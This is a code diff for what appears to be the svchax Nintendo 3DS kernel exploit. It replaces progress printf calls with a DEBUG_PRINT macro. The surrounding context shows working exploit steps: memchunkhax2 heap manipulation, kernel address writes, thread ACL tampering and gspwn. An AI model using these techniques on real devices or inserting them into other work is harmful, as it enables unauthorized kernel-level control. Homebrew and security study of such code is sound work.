@@ -16,6 +16,12 @@
 #define SVC_ACL_MASK(svc_id)     (0x1 << ((svc_id) & 0x1F))
 #define THREAD_PAGE_ACL_OFFSET   0xF38
 
+#ifdef DEBUG
+#define DEBUG_PRINT(...) printf(__VA_ARGS__)
+#else
+#define DEBUG_PRINT(...)
+#endif
+
 u32 __ctr_svchax = 0;
 u32 __ctr_svchax_srv = 0;
 
@@ -214,7 +220,7 @@ static void create_check_tls_threads(mch2_vars_t *mch2) {
       }
       svcCloseHandle(mch2->threads[i].handle);
    }
-   printf("[x] check tls threads\n");
+   DEBUG_PRINT("[x] check tls threads\n");
 }
 
 static void create_dummy_threads(mch2_vars_t *mch2) {
@@ -246,7 +252,7 @@ static void create_dummy_threads(mch2_vars_t *mch2) {
    }
 
    svcCloseHandle(mch2->dummy_threads_lock);
-   printf("[x] create dummy threads\n");
+   DEBUG_PRINT("[x] create dummy threads\n");
 }
 
 static void create_target_thread(mch2_vars_t *mch2, mch2_thread_t *thread) {
@@ -312,7 +318,7 @@ static void do_memchunkhax2(void)
    u32 fragmented_address = 0;
 
    mch2.arbiter = __sync_get_arbiter();
-   printf("- arbiter: 0x%x\n", mch2.arbiter);
+   DEBUG_PRINT("- arbiter: 0x%lx\n", mch2.arbiter);
 
    u32 linear_buffer;
    svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
@@ -345,7 +351,7 @@ static void do_memchunkhax2(void)
    u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + mch2.kernel_fcram_mapping_offset;
 
    mch2.thread_page_kva = get_first_free_basemem_page(mch2.isNew3DS) - 0x10000; // skip down 16 pages
-   printf("- thread_page_kva: 0x%x\n", mch2.thread_page_kva);
+   DEBUG_PRINT("- thread_page_kva: 0x%lx\n", mch2.thread_page_kva);
    ((u32*)linear_buffer)[0] = 1;
    ((u32*)linear_buffer)[1] = mch2.thread_page_kva;
    ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((mch2.alloc_size >> 12) - 3) << 13) + (skip_pages << 12);
@@ -361,7 +367,7 @@ static void do_memchunkhax2(void)
    svcCreateThread(&mch2.alloc_thread, (ThreadFunc)alloc_thread_entry, (u32)&mch2,
                    mch2.threads[MCH2_THREAD_COUNT_MAX - 1].stack_top, 0x3F, 1);
 
-   printf("- alloc_address: 0x%x\n", mch2.alloc_address);
+   DEBUG_PRINT("- alloc_address: 0x%lx\n", mch2.alloc_address);
    while ((u32) svcArbitrateAddress(mch2.arbiter, mch2.alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0,
                                     0) == 0xD9001814);
 
@@ -374,13 +380,13 @@ static void do_memchunkhax2(void)
 
    svcWaitSynchronization(mch2.alloc_thread, U64_MAX);
    svcCloseHandle(mch2.alloc_thread);
-   printf("[x] alloc thread entry\n");
+   DEBUG_PRINT("[x] alloc thread entry\n");
 
    u32* mapped_page = (u32*)(mch2.alloc_address + mch2.alloc_size - 0x1000);
 
    volatile u32* thread_ACL = &mapped_page[THREAD_PAGE_ACL_OFFSET >> 2];
 
-   printf("[x] target thread... ");
+   DEBUG_PRINT("[x] target thread... ");
    svcCreateEvent(&mch2.target_threads_lock, 1);
    svcClearEvent(mch2.target_threads_lock);
 
@@ -409,26 +415,25 @@ static void do_memchunkhax2(void)
 
    close_not_keep_target_threads(&mch2);
 
-   printf("done\n");
+   DEBUG_PRINT("done\n");
 
-   printf("[x] get control memory 1\n");
+   DEBUG_PRINT("[x] get control memory 1\n");
    svcControlMemory(&tmp, mch2.alloc_address, 0, mch2.alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
    write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
    svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   printf("[x] get control memory 2\n");
+   DEBUG_PRINT("[x] get control memory 2\n");
    for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
       svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
-   printf("[x] get control memory 3\n");
+   DEBUG_PRINT("[x] get control memory 3\n");
    svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
 
    aptOpenSession();
    APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
    aptCloseSession();
-   printf("[x] done\n");
+   DEBUG_PRINT("[x] done\n");
 }
-
 
 static void gspwn(u32 dst, u32 src, u32 size, u8* flush_buffer)
 {
